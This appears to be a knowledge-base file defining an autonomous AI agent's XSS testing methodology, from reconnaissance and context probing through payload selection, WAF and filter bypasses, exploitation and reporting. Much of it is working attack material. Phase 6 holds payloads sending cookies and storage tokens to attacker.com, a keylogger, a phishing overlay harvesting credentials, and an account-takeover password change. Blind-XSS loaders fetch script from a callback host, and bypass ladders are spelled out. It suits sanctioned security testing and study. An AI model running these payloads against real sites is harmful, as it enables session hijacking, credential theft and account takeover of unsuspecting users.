# 39 - XSS Agent Testing Methodology

## Overview

This document defines the complete, step-by-step XSS testing methodology for the autonomous XSS agent. It covers every phase from pre-engagement reconnaissance through exploitation and report generation. Each phase includes concrete procedures, tool commands, decision criteria, and expected outputs. The methodology is designed to be executed sequentially, with branching logic at key decision points to adapt to the target environment.

**Cross-references**: Decision logic details in `40-agent-decision-logic.md`, integration protocols in `41-agent-integration.md`, payload libraries in `37-xss-polyglots.md` and payload directory files.

---

## Phase 1: Pre-Engagement Reconnaissance

### 1.1 Technology Stack Identification

Before injecting a single payload, profile the target to select context-appropriate attack strategies.

**Framework Detection**

| Indicator | Framework | XSS Implications |
|-----------|-----------|-------------------|
| `ng-app`, `ng-model`, `{{expression}}` in DOM | Angular | Template injection via `{{constructor.constructor('alert(1)')()}}` (Angular < 1.6). Angular 2+ uses DomSanitizer -- target `bypassSecurityTrust*` misuse. |
| `data-reactroot`, `__NEXT_DATA__`, `_reactRootContainer` | React / Next.js | JSX escapes by default; target `dangerouslySetInnerHTML`, `href` with `javascript:`, SSR hydration mismatches. |
| `data-v-*` attributes, `__vue__` on elements | Vue.js | Template injection via `v-html`, client-side template injection in `{{}}` (Vue 2 uncompiled templates). |
| `jQuery` global, `$.fn.jquery` | jQuery | `.html()`, `.append()`, `.after()` with unsanitized input; `$()` selector injection acting as HTML parser. |
| `_next/static`, `__NUXT__` | Next.js / Nuxt.js | SSR data injection, `getServerSideProps` reflected data, hydration mismatches. |
| `wp-content`, `wp-includes` | WordPress | Known plugin XSS, shortcode injection, REST API reflected parameters. |

**Detection Commands**

```bash
# Wappalyzer CLI for technology profiling
wappalyzer https://target.com --pretty

# Manual header inspection
curl -sI https://target.com | grep -iE "x-powered-by|server|x-aspnet|x-drupal"

# JavaScript framework detection via DOM inspection
# (Executed in browser console or via Playwright/Puppeteer)
# React: !!document.querySelector('[data-reactroot]')
# Angular: !!window.getAllAngularRootElements
# Vue: !!document.querySelector('[data-v-]')
# jQuery: !!window.jQuery
```

### 1.2 CSP Header Analysis

Retrieve and assess Content Security Policy before crafting payloads. A strong CSP changes the entire attack strategy.

```bash
# Retrieve CSP header
curl -sI https://target.com | grep -i "content-security-policy"

# Automated CSP assessment
# Paste policy into https://csp-evaluator.withgoogle.com/

# Check for Report-Only (no enforcement)
curl -sI https://target.com | grep -i "content-security-policy-report-only"
```

**CSP-Driven Strategy Selection**

| CSP State | Strategy |
|-----------|----------|
| No CSP present | Full payload library available; no restrictions. |
| Report-Only only | Zero enforcement; treat as no CSP. |
| `unsafe-inline` in script-src | CSP provides no XSS protection; use inline payloads freely. |
| `unsafe-eval` in script-src | Target dynamic code execution sinks: `Function()`, `setTimeout(string)`. |
| `data:` in script-src | Use `<script src="data:text/javascript,alert(1)">`. |
| Nonce-based | Hunt for nonce leakage in DOM, meta tags, or XSS that injects before nonce assignment. Look for `strict-dynamic` propagation via script gadgets. |
| Strict with `strict-dynamic` | Focus on script gadgets loaded by nonced scripts. See KB file `13-csp-bypass-techniques.md`. |
| Tight policy, no bypasses found | Shift to dangling markup injection, CSS exfiltration, or mutation XSS. Document as a hardened target. |

Full CSP analysis methodology is in KB file `12-csp-bypass-fundamentals.md`.

### 1.3 WAF Detection

Identify Web Application Firewalls early to avoid wasting time on payloads that will be blocked at the network layer.

```bash
# wafw00f for WAF fingerprinting
wafw00f https://target.com

# Manual WAF detection via payload triggering
curl -s "https://target.com/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
# 403 or custom block page = WAF active

# Check response headers for WAF signatures
curl -sI "https://target.com/?q=<script>" | grep -iE "cf-ray|x-sucuri|x-akamai|x-amz-cf|server.*cloudflare|server.*akamai"
```

**WAF Vendor Identification**

| Header/Behavior | WAF Vendor |
|-----------------|------------|
| `cf-ray`, `server: cloudflare` | Cloudflare |
| `x-sucuri-id` | Sucuri |
| `x-akamai-transformed` | Akamai |
| `x-amz-cf-id` | AWS CloudFront/WAF |
| `server: AkamaiGHost` | Akamai |
| Generic 403 with custom HTML | ModSecurity / proprietary |

WAF-specific bypass strategies are in KB file `17-waf-bypass-xss.md`.

### 1.4 Authentication Requirements

Determine which input surfaces require authentication and coordinate with the auth-agent for session context.

- **Unauthenticated surfaces**: Search bars, contact forms, login/registration pages, public comments, URL parameters on public pages.
- **Authenticated surfaces**: Profile fields, messaging systems, file uploads, settings pages, admin panels, API endpoints.
- **Role-gated surfaces**: Admin dashboards, moderation tools, internal tools (blind XSS targets).

Request authenticated sessions from auth-agent using the integration protocol defined in `41-agent-integration.md`.

---

## Phase 2: Input Point Discovery and Mapping

### 2.1 Parameter Discovery

Systematically enumerate every input vector the application accepts.

**Automated Parameter Discovery**

```bash
# ParamSpider: mine parameters from web archives
paramspider -d target.com --output params.txt

# Arjun: brute-force hidden GET/POST parameters
arjun -u https://target.com/search -m GET POST -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# GAP (Get All Parameters) from Burp traffic
# Export Burp sitemap as XML, then extract parameters

# x8: advanced parameter discovery with smart detection
x8 -u "https://target.com/page" -w params.txt
```

**Manual Parameter Sources**

| Source | What to Extract |
|--------|----------------|
| URL query string | `?param=value&other=value` |
| POST body (form) | Form field `name` attributes |
| POST body (JSON) | All JSON keys at every depth |
| URL path segments | `/api/v1/{resource}/{id}` |
| HTTP headers | `Referer`, `User-Agent`, `X-Forwarded-For`, `Host`, custom headers |
| Cookies | Cookie names and values |
| Fragment (#) | Hash-based routing parameters (DOM XSS sources) |
| WebSocket messages | All fields in WS message payloads |

### 2.2 Hidden Parameter and Endpoint Discovery

```bash
# Crawl with gospider for comprehensive URL/parameter extraction
gospider -s https://target.com -d 3 -c 10 --js --sitemap --robots

# Extract endpoints from JavaScript bundles
# Download all JS files, then extract URL patterns
katana -u https://target.com -jc -d 3 -o urls.txt

# LinkFinder: extract endpoints from JS files
linkfinder -i https://target.com/static/app.js -o cli

# Check for hidden input fields in forms
# Look for: type="hidden", disabled inputs, data attributes
```

### 2.3 File Upload Points

File uploads are high-value XSS vectors (SVG upload, HTML upload, filename injection).

**Identification checklist**:
- Profile picture / avatar upload
- Document attachment upload
- Import functionality (CSV, XML, JSON)
- Rich text / WYSIWYG editors
- Ticket / support form attachments

See KB file `25-file-upload-xss.md` for exploitation.

### 2.4 WebSocket Endpoints

```bash
# Discover WebSocket endpoints
# Check for ws:// or wss:// in JavaScript source
grep -rn "new WebSocket\|\.onmessage\|\.send(" /path/to/downloaded/js/

# Test WebSocket messages for reflection
# Use websocat or browser DevTools to inject payloads into WS messages
websocat wss://target.com/ws
```

### 2.5 Input Point Prioritization

After discovery, prioritize input points by XSS likelihood:

| Priority | Input Characteristic | Rationale |
|----------|---------------------|-----------|
| P0 (Critical) | Reflected in HTML body unencoded | Direct injection, highest success rate |
| P1 (High) | Reflected in HTML attributes | Attribute breakout likely |
| P1 (High) | Stored in user-visible content | Stored XSS potential |
| P2 (Medium) | Reflected in JavaScript context | String breakout needed |
| P2 (Medium) | Used in client-side DOM manipulation | DOM XSS source |
| P3 (Lower) | Reflected in HTTP headers only | Limited exploitation |
| P3 (Lower) | File upload with type restrictions | Bypass required |
| P4 (Blind) | Input consumed by admin/internal tools | Blind XSS -- deploy canary |

---

## Phase 3: Context Analysis

### 3.1 Reflection Probe

For every discovered input point, inject a unique canary string with special characters to determine the reflection context and encoding behavior.

**Canary Payload**: `xss<>'"%;)(&#{}`

**Analysis Procedure**:

1. Submit canary in the input parameter.
2. Search the HTTP response body for the canary.
3. Record the surrounding HTML/JS context.
4. Note which characters survived unencoded.

**Character Survival Matrix**

| Character | Survived? | Implication |
|-----------|-----------|-------------|
| `<` and `>` | Yes | Tag injection possible |
| `"` | Yes | Double-quote attribute breakout possible |
| `'` | Yes | Single-quote attribute breakout or JS string breakout possible |
| `(` and `)` | Yes | Function calls possible in JS context |
| `/` | Yes | Can close tags or use in `</script>` |
| `{` and `}` | Yes | Template injection possible (Angular/Vue) |
| `;` | Yes | Statement termination in JS context |

### 3.2 Context Classification

Map each reflection point to one of the following contexts:

| Context | Indicator | Primary Strategy |
|---------|-----------|-----------------|
| **HTML body** (between tags) | Canary appears inside `<div>`, `<p>`, etc. | Inject new tags: `<img src=x onerror=alert(1)>` |
| **HTML attribute** (inside value) | Canary inside `value="..."`, `class="..."` | Break out of attribute, add event handler |
| **URL attribute** (href, src, action) | Canary inside `href="..."`, `src="..."` | `javascript:` protocol injection |
| **JavaScript string** | Canary inside `var x = "..."` or `'...'` | Close string, inject statement |
| **JavaScript template literal** | Canary inside backtick string | `${alert(1)}` expression injection |
| **HTML comment** | Canary inside `<!-- ... -->` | Close comment with `-->`, then inject |
| **CSS context** | Canary inside `<style>` or `style="..."` | CSS exfiltration, legacy `expression()` |
| **SVG/MathML** | Canary inside `<svg>` or `<math>` | Namespace-specific event handlers |
| **DOM only** (no server reflection) | Canary not in response but appears in rendered DOM | DOM XSS -- trace sources to sinks |
| **Not reflected** | Canary absent from response and DOM | Stored XSS or blind XSS candidate |

### 3.3 Server-Side vs Client-Side Rendering

**Detection method**:
1. View page source (Ctrl+U) and search for canary -- if found, server-side rendered.
2. If not in source but visible in DOM (DevTools Elements panel), client-side rendered.
3. Client-side rendering implies DOM XSS testing is the primary vector.
4. Check for `__NEXT_DATA__`, `window.__INITIAL_STATE__`, or hydration data in page source.

### 3.4 Template Engine Identification

| Probe | Engine Indicated | XSS Vector |
|-------|-----------------|-------------|
| `{{7*7}}` renders `49` | Angular (uncompiled), Vue (v-html misuse), Jinja2/Twig (SSTI) | Template injection |
| `${7*7}` renders `49` | JavaScript template literals, Freemarker | Expression injection |
| `<%= 7*7 %>` renders `49` | ERB, EJS | Server-side template injection |
| `#{7*7}` renders `49` | Pug/Jade | Template injection |

---

## Phase 4: Payload Strategy Selection

### 4.1 Context-to-Payload Mapping

Based on the context identified in Phase 3, select the appropriate initial payload set:

**HTML Body Context** --> Start with KB file `03-reflected-xss-html-context.md` payloads:
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
```

**HTML Attribute Context** --> Attribute breakout payloads:
```
" onfocus=alert(1) autofocus "
" onmouseover=alert(1) "
"><img src=x onerror=alert(1)>
' onfocus='alert(1)' autofocus '
```

**JavaScript String Context** --> String breakout payloads from KB file `04-reflected-xss-javascript-context.md`:
```
";alert(1);//
';alert(1);//
</script><img src=x onerror=alert(1)>
\";alert(1);//
```

**URL Attribute Context** --> Protocol payloads:
```
javascript:alert(1)
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
```

**DOM XSS** --> Source-to-sink analysis from KB files `09-dom-xss-sources-sinks.md` and `10-dom-xss-modern.md`.

### 4.2 XSS Type Testing Priority

| Condition | Priority Order |
|-----------|---------------|
| Heavy client-side rendering (SPA) | DOM XSS first, then reflected, then stored |
| User-generated content (social, forums) | Stored XSS first, then reflected, then DOM |
| Admin panel accessible | Deploy blind XSS immediately alongside other testing |
| Default/unknown | Reflected first (fastest feedback), then stored, then DOM |
| Always | Deploy blind XSS canary payloads to admin-consumed inputs |

### 4.3 Blind XSS Deployment Strategy

Deploy blind XSS payloads to every input that might be consumed by internal/admin tools:

**Target inputs**: Contact forms, support tickets, feedback forms, user-agent strings, referrer headers, registration fields, error reporting.

**Blind XSS payload template** (requires a callback server such as XSS Hunter, bxss.in, or custom):
```html
"><script src=https://YOUR-CALLBACK.xss.ht></script>
"><img src=x onerror="var s=document.createElement('script');s.src='https://YOUR-CALLBACK.xss.ht';document.body.appendChild(s);">
```

See KB file `08-blind-xss.md` for comprehensive blind XSS methodology.

---

## Phase 5: Testing Execution with Bypass Engineering

### 5.1 Initial Payload Testing

For each input point and its identified context, submit the primary payload from Phase 4 and analyze the result:

| Response | Next Step |
|----------|-----------|
| Payload executes (verified via alert/callback) | **XSS confirmed** -- proceed to Phase 6 |
| Payload reflected but modified (partial encoding) | Analyze what was filtered -- proceed to 5.2 |
| Payload completely stripped | Identify filter type -- proceed to 5.2 |
| Payload triggers WAF block (403/captcha) | WAF active -- proceed to 5.3 |
| Payload reflected but CSP blocks execution | CSP enforced -- proceed to 5.4 |
| No reflection visible | Re-check context; consider stored/blind XSS |

### 5.2 Filter Detection and Bypass Iteration

**Step 1: Determine what is filtered**

Submit these probes individually and note which are blocked:
- `<script>` -- tag name filtering?
- `<img>` -- alternative tags blocked?
- `onerror` -- event handler filtering?
- `alert` -- function name filtering?
- `javascript:` -- protocol filtering?
- `<` and `>` -- angle bracket encoding?
- `"` and `'` -- quote encoding?
- `on` prefix -- event handler prefix blocked?

**Step 2: Select bypass based on filter gap**

| Filtered Element | Bypass Approach | Example |
|-----------------|-----------------|---------|
| `<script>` tag | Use alternative tags | `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>` |
| Common tags (img, svg) | Use uncommon tags | `<details open ontoggle=alert(1)>`, `<math><mi//onclick=alert(1)>` |
| `onerror` handler | Use alternative events | `onfocus`, `ontoggle`, `onpointerover`, `onanimationstart` |
| `alert` function | Use alternatives | `confirm(1)`, `prompt(1)`, `print()`, `top["al"+"ert"](1)` |
| `on*` prefix | Use `javascript:` protocol | `<a href=javascript:alert(1)>click</a>` |
| Angle brackets `<>` | Stay in attribute context | `" onfocus=alert(1) autofocus "` (no new tags) |
| Quotes `"'` | Use backticks or unquoted attributes | alert`1`, `<img src=x onerror=alert(1)>` |
| Encoding applied (HTML entities) | Double encoding | `%253Cscript%253E` if server URL-decodes twice |
| Recursive stripping (removes `<script>`) | Nested bypass | `<scr<script>ipt>alert(1)</scr</script>ipt>` |

Full filter bypass catalog is in KB file `15-filter-bypass-server.md`.

### 5.3 WAF Bypass Escalation

When a WAF blocks payloads, escalate through encoding and obfuscation layers:

**Escalation ladder** (try in order):

1. **Case variation**: `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>`
2. **Whitespace/null bytes**: `<img/src=x/onerror=alert(1)>`, `<img%00src=x%00onerror=alert(1)>`
3. **HTML encoding in attributes**: `&#97;lert(1)`, `&#x61;lert(1)`
4. **Double URL encoding**: `%253Cscript%253E`
5. **Unicode normalization**: Fullwidth characters that normalize to ASCII
6. **Comment insertion**: `<scr<!--comment-->ipt>`
7. **Vendor-specific bypasses**: See KB file `17-waf-bypass-xss.md` for Cloudflare, AWS WAF, Akamai, ModSecurity-specific techniques
8. **Polyglot payloads**: See KB file `37-xss-polyglots.md`

### 5.4 CSP Bypass (When Execution is Blocked)

If the payload reflects/stores but CSP prevents execution:

1. Re-analyze the CSP policy (see Phase 1.2).
2. Check for `unsafe-inline`, `unsafe-eval`, `data:`, or overly broad whitelists.
3. Assess whitelisted domains for JSONP endpoints or script gadgets.
4. Look for nonce leakage or base-uri hijacking opportunities.
5. Consider CSP-compatible exploitation: dangling markup, CSS injection for data theft.

Full CSP bypass methodology is in KB files `12-csp-bypass-fundamentals.md`, `13-csp-bypass-techniques.md`, and `14-csp-bypass-real-world.md`.

---

## Phase 6: Exploitation and Impact Demonstration

### 6.1 PoC Payload Selection

Once XSS is confirmed, escalate from `alert(1)` to a meaningful proof of concept that demonstrates real impact.

**Impact Tier Selection**

| Target Characteristic | PoC Payload | Impact Level |
|----------------------|-------------|--------------|
| Non-HttpOnly session cookies | Cookie theft via `document.cookie` exfiltration | Critical |
| HttpOnly cookies, but JS-accessible tokens | Extract tokens from `localStorage`, `sessionStorage`, DOM | Critical |
| HttpOnly cookies, no JS tokens | Perform authenticated actions (CSRF-like via XSS) | High |
| Admin panel XSS | Account takeover via password change or admin action | Critical |
| Public-facing stored XSS | Worm potential, mass user impact | Critical |
| Self-XSS only (requires victim action) | Demonstrate with social engineering scenario | Medium |

### 6.2 Impact Demonstration Payloads

**Cookie theft (non-HttpOnly)**:
```javascript
fetch('https://attacker.com/log',{method:'POST',mode:'no-cors',body:document.cookie})
```

**Account takeover via password change**:
```javascript
fetch('/api/account/password',{
  method:'POST',
  headers:{
    'Content-Type':'application/json',
    'X-CSRF-Token':document.querySelector('meta[name=csrf-token]').content
  },
  body:JSON.stringify({new_password:'hacked123'})
})
```

**Session token exfiltration (localStorage/sessionStorage)**:
```javascript
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({local:localStorage,session:sessionStorage})
})
```

**Keylogging**:
```javascript
document.onkeypress=e=>fetch('https://attacker.com/keys?k='+e.key,{mode:'no-cors'})
```

**Phishing overlay**:
```javascript
document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999"><form action=https://attacker.com/phish method=POST><h2>Session Expired</h2><input name=user placeholder=Email><input name=pass type=password placeholder=Password><button type=submit>Login</button></form></div>'
```

Full exploitation payloads are in KB files `19-exploitation-session-hijack.md`, `20-exploitation-account-takeover.md`, `21-exploitation-rce-advanced.md`, and `22-exploitation-payloads.md`.

### 6.3 Escalation Paths

| Starting Point | Escalation | KB Reference |
|----------------|-----------|--------------|
| Reflected XSS | Chain with open redirect for wider phishing | `22-exploitation-payloads.md` |
| Stored XSS | Worm propagation (self-replicating payload) | `22-exploitation-payloads.md` |
| Admin panel blind XSS | Full admin account takeover | `08-blind-xss.md`, `20-exploitation-account-takeover.md` |
| XSS in Electron app | Remote code execution via `nodeIntegration` | `21-exploitation-rce-advanced.md` |
| XSS in WebView (mobile) | Access native APIs, file system | `21-exploitation-rce-advanced.md` |
| XSS + IDOR | Access other users' data via XSS-initiated requests | `41-agent-integration.md` |

---

## Phase 7: Report Generation

### 7.1 Finding Classification

| Field | Content |
|-------|---------|
| **Title** | `[XSS Type] Cross-Site Scripting in [Component/Parameter]` |
| **Severity** | Use CVSS scoring (see 7.2) |
| **Vulnerability Type** | CWE-79 (Reflected), CWE-79 (Stored), CWE-79 (DOM-based) |
| **Affected URL(s)** | Full URL with vulnerable parameter highlighted |
| **Payload** | Exact payload that triggers execution |
| **Impact** | Concrete impact demonstrated (cookie theft, ATO, etc.) |
| **Steps to Reproduce** | Numbered steps any tester can follow |
| **Remediation** | Context-specific fix recommendations |
| **References** | OWASP, CWE, relevant KB files |

### 7.2 CVSS v3.1 Scoring Guide for XSS

**Reflected XSS (typical)**:
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: Required (UI:R)
- Scope: Changed (S:C) -- executes in victim's browser context
- Confidentiality: Low (C:L) -- cookie/token theft
- Integrity: Low (I:L) -- can modify page content
- Availability: None (A:N)
- **Base Score: 6.1 (Medium)**

**Stored XSS (typical)**:
- Same as above but Scope: Changed, and often C:H/I:H if admin-accessible
- **Base Score: 6.1 - 9.0 depending on impact**

**Stored XSS with admin ATO**:
- C:H, I:H, A:H with S:C
- **Base Score: 9.0+ (Critical)**

**DOM XSS**: Score same as reflected unless it has stored characteristics.

### 7.3 Remediation Recommendations

Always include context-specific remediation:

| Context | Recommended Fix |
|---------|-----------------|
| HTML body output | HTML entity encoding (`<` to `&lt;`, `>` to `&gt;`, etc.) |
| HTML attribute output | Attribute encoding + always quote attributes |
| JavaScript context output | JavaScript Unicode encoding + avoid inline user data in scripts |
| URL context output | URL encoding + whitelist `http://` and `https://` protocols only |
| CSS context output | CSS encoding + avoid user input in style contexts |
| DOM manipulation | Use `textContent` instead of `innerHTML`; avoid dangerous sinks |
| General | Implement CSP with nonce-based script-src, set HttpOnly and Secure cookie flags |

---

## Methodology Execution Checklist

```
[ ] Phase 1: Pre-Engagement Reconnaissance
    [ ] Technology stack identified (framework, server, WAF)
    [ ] CSP header retrieved and analyzed
    [ ] WAF detected and vendor identified
    [ ] Authentication requirements mapped
    [ ] Auth-agent session context received (if needed)

[ ] Phase 2: Input Point Discovery
    [ ] Automated parameter discovery completed (ParamSpider, Arjun)
    [ ] Hidden parameters and endpoints enumerated
    [ ] File upload points identified
    [ ] WebSocket endpoints cataloged
    [ ] Input points prioritized by XSS likelihood

[ ] Phase 3: Context Analysis
    [ ] Canary probe submitted to all input points
    [ ] Character survival matrix documented per input
    [ ] Reflection context classified per input
    [ ] Server-side vs client-side rendering determined
    [ ] Template engine identified (if applicable)

[ ] Phase 4: Payload Strategy Selection
    [ ] Context-appropriate payload set selected per input
    [ ] XSS type testing priority established
    [ ] Blind XSS canary deployed to admin-consumed inputs

[ ] Phase 5: Testing Execution
    [ ] Initial payloads submitted
    [ ] Filter gaps identified for blocked payloads
    [ ] Bypass payloads iterated per filter type
    [ ] WAF bypass escalation applied (if WAF present)
    [ ] CSP bypass attempted (if CSP enforced)

[ ] Phase 6: Exploitation and Impact
    [ ] PoC payload selected per confirmed finding
    [ ] Impact demonstrated (cookie theft, ATO, etc.)
    [ ] Escalation paths assessed

[ ] Phase 7: Report Generation
    [ ] Finding classified with CVSS score
    [ ] Steps to reproduce documented
    [ ] Remediation recommendations provided
    [ ] Report submitted
```

---

## Key Takeaways

1. **Reconnaissance drives strategy**: Technology stack and CSP determine the entire payload selection approach. Never skip Phase 1.
2. **Context is everything**: The same input might land in HTML body on one endpoint and JavaScript string on another. Always probe context first.
3. **Bypass is iterative**: Filter evasion is not a single step but a ladder of escalating techniques. Systematically narrow down what is blocked and exploit the gaps.
4. **Impact wins bounties**: `alert(1)` is confirmation, not impact. Always escalate to demonstrate real-world consequences.
5. **Blind XSS is always deployed**: Every engagement should include blind XSS canary deployment to admin/internal input surfaces.
6. **Report quality matters**: A well-documented, reproducible finding with clear impact and remediation is worth more than ten poorly written ones.
